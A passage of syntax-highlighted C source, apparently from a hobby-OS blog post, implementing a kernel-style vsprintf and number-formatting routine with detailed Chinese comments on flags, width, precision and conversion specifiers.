class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEROPAD 1  <span class="comment">// 填充零</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGN 2     <span class="comment">// unsigned/signed long</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PLUS 4     <span class="comment">// 显示加</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPACE 8    <span class="comment">// 如是加，则置空格</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEFT 16    <span class="comment">// 左调整</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPECIAL 32 <span class="comment">// 0x</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL 64   <span class="comment">// 使用小写字母</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> is_digit(c) ((c) &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; (c) &lt;= <span class="string">&#x27;9&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符数字串转换成整数，并将指针前移</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">skip_atoi</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (is_digit(**s))</span><br><span class="line">        i = i * <span class="number">10</span> + *((*s)++) - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将整数转换为指定进制的字符串</span></span><br><span class="line"><span class="comment">// str - 输出字符串指针</span></span><br><span class="line"><span class="comment">// num - 整数</span></span><br><span class="line"><span class="comment">// base - 进制基数</span></span><br><span class="line"><span class="comment">// size - 字符串长度</span></span><br><span class="line"><span class="comment">// precision - 数字长度(精度)</span></span><br><span class="line"><span class="comment">// flags - 选项</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">number</span><span class="params">(<span class="type">char</span> *str, <span class="type">unsigned</span> <span class="type">long</span> num, <span class="type">int</span> base, <span class="type">int</span> size, <span class="type">int</span> precision, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c, sign, tmp[<span class="number">36</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *digits = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> *ptr = str;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 flags 指出用小写字母，则定义小写字母集</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; SMALL)</span><br><span class="line">        digits = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 flags 指出要左对齐，则屏蔽类型中的填零标志</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; LEFT)</span><br><span class="line">        flags &amp;= ~ZEROPAD;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果进制基数小于 2 或大于 36，则退出处理</span></span><br><span class="line">    <span class="comment">// 也即本程序只能处理基数在 2-32 之间的数</span></span><br><span class="line">    <span class="keyword">if</span> (base &lt; <span class="number">2</span> || base &gt; <span class="number">36</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 flags 指出要填零，则置字符变量 c=&#x27;0&#x27;，否则 c 等于空格字符</span></span><br><span class="line">    c = (flags &amp; ZEROPAD) ? <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 flags 指出是带符号数并且数值 num 小于 0，则置符号变量 sign=负号，并使 num 取绝对值</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; SIGN &amp;&amp; num &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sign = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        num = -num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 否则如果 flags 指出是加号，则置 sign=加号，否则若类型带空格标志则 sign=空格，否则置 0</span></span><br><span class="line">        sign = (flags &amp; PLUS) ? <span class="string">&#x27;+&#x27;</span> : ((flags &amp; SPACE) ? <span class="string">&#x27; &#x27;</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若带符号，则宽度值减 1</span></span><br><span class="line">    <span class="keyword">if</span> (sign)</span><br><span class="line">        size--;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 flags 指出是特殊转换，则对于十六进制宽度再减少 2 位(用于0x)</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; SPECIAL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (base == <span class="number">16</span>)</span><br><span class="line">            size -= <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 对于八进制宽度减 1（用于八进制转换结果前放一个零）</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (base == <span class="number">8</span>)</span><br><span class="line">            size--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 如果数值 num 为 0，则临时字符串=&#x27;0&#x27;；否则根据给定的基数将数值 num 转换成字符形式</span></span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">0</span>)</span><br><span class="line">        tmp[i++] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">while</span> (num != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            index = num % base;</span><br><span class="line">            num /= base;</span><br><span class="line">            tmp[i++] = digits[index];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若数值字符个数大于精度值，则精度值扩展为数字个数值</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt; precision)</span><br><span class="line">        precision = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 宽度值 size 减去用于存放数值字符的个数</span></span><br><span class="line">    size -= precision;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从这里真正开始形成所需要的转换结果，并暂时放在字符串 str 中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 flags 中没有填零(ZEROPAD) 和左对齐（左调整）标志</span></span><br><span class="line">    <span class="comment">// 则在 str 中首先填放剩余宽度值指出的空格数</span></span><br><span class="line">    <span class="keyword">if</span> (!(flags &amp; (ZEROPAD + LEFT)))</span><br><span class="line">        <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</span><br><span class="line">            *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若需带符号位，则存入符号</span></span><br><span class="line">    <span class="keyword">if</span> (sign)</span><br><span class="line">        *str++ = sign;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 flags 指出是特殊转换</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; SPECIAL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 则对于八进制转换结果头一位放置一个&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> (base == <span class="number">8</span>)</span><br><span class="line">            *str++ = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 对于十六进制则存放&#x27;0x&#x27;</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (base == <span class="number">16</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *str++ = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            *str++ = digits[<span class="number">33</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若 flags 中没有左调整（左对齐）标志, 则在剩余宽度中存放 c 字符（&#x27;0&#x27;或空格）</span></span><br><span class="line">    <span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">        <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</span><br><span class="line">            *str++ = c;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时 i 存有数值 num 的数字个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若数字个数小于精度值，则 str 中放入（精度值-i）个&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; precision--)</span><br><span class="line">        *str++ = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将转数值换好的数字字符填入 str 中，共 i 个</span></span><br><span class="line">    <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        *str++ = tmp[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若宽度值仍大于零</span></span><br><span class="line">    <span class="comment">// 则表示 flags 标志中有左对齐标志标志</span></span><br><span class="line">    <span class="comment">// 则在剩余宽度中放入空格</span></span><br><span class="line">    <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</span><br><span class="line">        *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vsprintf</span><span class="params">(<span class="type">char</span> *buf, <span class="type">const</span> <span class="type">char</span> *fmt, va_list args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于存放转换过程中的字符串</span></span><br><span class="line">    <span class="type">char</span> *str;</span><br><span class="line">    <span class="type">char</span> *s;</span><br><span class="line">    <span class="type">int</span> *ip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number() 函数使用的标志</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> field_width; <span class="comment">// 输出字段宽度</span></span><br><span class="line">    <span class="type">int</span> precision;   <span class="comment">// min 整数数字个数；max 字符串中字符个数</span></span><br><span class="line">    <span class="type">int</span> qualifier;   <span class="comment">// &#x27;h&#x27;, &#x27;l&#x27; 或 &#x27;L&#x27; 用于整数字段</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先将字符指针指向 buf</span></span><br><span class="line">    <span class="comment">// 然后扫描格式字符串，</span></span><br><span class="line">    <span class="comment">// 对各个格式转换指示进行相应的处理</span></span><br><span class="line">    <span class="keyword">for</span> (str = buf; *fmt; ++fmt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 格式转换指示字符串均以 &#x27;%&#x27; 开始</span></span><br><span class="line">        <span class="comment">// 这里从 fmt 格式字符串中扫描 &#x27;%&#x27;，寻找格式转换字符串的开始</span></span><br><span class="line">        <span class="comment">// 不是格式指示的一般字符均被依次存入 str</span></span><br><span class="line">        <span class="keyword">if</span> (*fmt != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *str++ = *fmt;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面取得格式指示字符串中的标志域，并将标志常量放入 flags 变量中</span></span><br><span class="line">        flags = <span class="number">0</span>;</span><br><span class="line">    repeat:</span><br><span class="line">        <span class="comment">// 掉过第一个 %</span></span><br><span class="line">        ++fmt;</span><br><span class="line">        <span class="keyword">switch</span> (*fmt)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// 左对齐调整</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            flags |= LEFT;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 放加号</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            flags |= PLUS;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 放空格</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            flags |= SPACE;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 是特殊转换</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            flags |= SPECIAL;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 要填零(即&#x27;0&#x27;)，否则是空格</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            flags |= ZEROPAD;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取当前参数字段宽度域值，放入 field_width 变量中</span></span><br><span class="line">        field_width = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果宽度域中是数值则直接取其为宽度值</span></span><br><span class="line">        <span class="keyword">if</span> (is_digit(*fmt))</span><br><span class="line">            field_width = skip_atoi(&amp;fmt);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果宽度域中是字符 &#x27;*&#x27;，表示下一个参数指定宽度</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++fmt;</span><br><span class="line">            <span class="comment">// 因此调用 va_arg 取宽度值</span></span><br><span class="line">            field_width = va_arg(args, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若此时宽度值小于 0，则该负数表示其带有标志域 &#x27;-&#x27; 标志（左对齐）</span></span><br><span class="line">            <span class="keyword">if</span> (field_width &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 因此还需在标志变量中添入该标志，并将字段宽度值取为其绝对值</span></span><br><span class="line">                field_width = -field_width;</span><br><span class="line">                flags |= LEFT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取格式转换串的精度域，并放入 precision 变量中</span></span><br><span class="line">        precision = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 精度域开始的标志是&#x27;.&#x27; 其处理过程与上面宽度域的类似</span></span><br><span class="line">        <span class="keyword">if</span> (*fmt == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++fmt;</span><br><span class="line">            <span class="comment">// 如果精度域中是数值则直接取其为精度值</span></span><br><span class="line">            <span class="keyword">if</span> (is_digit(*fmt))</span><br><span class="line">                precision = skip_atoi(&amp;fmt);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果精度域中是字符&#x27;*&#x27;，表示下一个参数指定精度</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 因此调用 va_arg 取精度值</span></span><br><span class="line">                precision = va_arg(args, <span class="type">int</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 若此时宽度值小于 0，则将字段精度值取为其绝对值</span></span><br><span class="line">            <span class="keyword">if</span> (precision &lt; <span class="number">0</span>)</span><br><span class="line">                precision = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面这段代码分析长度修饰符，并将其存入 qualifer 变量</span></span><br><span class="line">        qualifier = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (*fmt == <span class="string">&#x27;h&#x27;</span> || *fmt == <span class="string">&#x27;l&#x27;</span> || *fmt == <span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            qualifier = *fmt;</span><br><span class="line">            ++fmt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面分析转换指示符</span></span><br><span class="line">        <span class="keyword">switch</span> (*fmt)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果转换指示符是&#x27;c&#x27;，则表示对应参数应是字符</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            <span class="comment">// 此时如果标志域表明不是左对齐，</span></span><br><span class="line">            <span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">                <span class="comment">// 则该字段前面放入 (宽度域值 - 1) 个空格字符，然后再放入参数字符</span></span><br><span class="line">                <span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</span><br><span class="line">                    *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            *str++ = (<span class="type">unsigned</span> <span class="type">char</span>)va_arg(args, <span class="type">int</span>);</span><br><span class="line">            <span class="comment">// 如果宽度域还大于 0，则表示为左对齐</span></span><br><span class="line">            <span class="comment">// 则在参数字符后面添加 (宽度值-1) 个空格字符</span></span><br><span class="line">            <span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</span><br><span class="line">                *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果转换指示符是 &#x27;s&#x27;，则表示对应参数是字符串</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = va_arg(args, <span class="type">char</span> *);</span><br><span class="line">            <span class="comment">// 首先取参数字符串的长度</span></span><br><span class="line">            len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="comment">// 若其超过了精度域值, 则扩展精度域=字符串长度</span></span><br><span class="line">            <span class="keyword">if</span> (precision &lt; <span class="number">0</span>)</span><br><span class="line">                precision = len;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len &gt; precision)</span><br><span class="line">                len = precision;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 此时如果标志域表明不是左对齐</span></span><br><span class="line">            <span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">                <span class="comment">// 则该字段前放入 (宽度值-字符串长度) 个空格字符</span></span><br><span class="line">                <span class="keyword">while</span> (len &lt; field_width--)</span><br><span class="line">                    *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="comment">// 然后再放入参数字符串</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">                *str++ = *s++;</span><br><span class="line">            <span class="comment">// 如果宽度域还大于 0，则表示为左对齐</span></span><br><span class="line">            <span class="comment">// 则在参数字符串后面，添加(宽度值-字符串长度)个空格字符</span></span><br><span class="line">            <span class="keyword">while</span> (len &lt; field_width--)</span><br><span class="line">                *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果格式转换符是&#x27;o&#x27;，表示需将对应的参数转换成八进制数的字符串</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">            str = number(str, va_arg(args, <span class="type">unsigned</span> <span class="type">long</span>), <span class="number">8</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果格式转换符是&#x27;p&#x27;，表示对应参数的一个指针类型</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            <span class="comment">// 此时若该参数没有设置宽度域，则默认宽度为 8，并且需要添零</span></span><br><span class="line">            <span class="keyword">if</span> (field_width == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                field_width = <span class="number">8</span>;</span><br><span class="line">                flags |= ZEROPAD;</span><br><span class="line">            &#125;</span><br><span class="line">            str = number(str,</span><br><span class="line">                         (<span class="type">unsigned</span> <span class="type">long</span>)va_arg(args, <span class="type">void</span> *), <span class="number">16</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若格式转换指示是 &#x27;x&#x27; 或 &#x27;X&#x27;</span></span><br><span class="line">        <span class="comment">// 则表示对应参数需要打印成十六进制数输出</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="comment">// &#x27;x&#x27;表示用小写字母表示</span></span><br><span class="line">            flags |= SMALL;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">            str = number(str, va_arg(args, <span class="type">unsigned</span> <span class="type">long</span>), <span class="number">16</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果格式转换字符是&#x27;d&#x27;, &#x27;i&#x27; 或 &#x27;u&#x27;，则表示对应参数是整数</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            <span class="comment">// &#x27;d&#x27;, &#x27;i&#x27;代表符号整数，因此需要加上带符号标志</span></span><br><span class="line">            flags |= SIGN;</span><br><span class="line">        <span class="comment">// &#x27;u&#x27;代表无符号整数</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            str = number(str, va_arg(args, <span class="type">unsigned</span> <span class="type">long</span>), <span class="number">10</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span 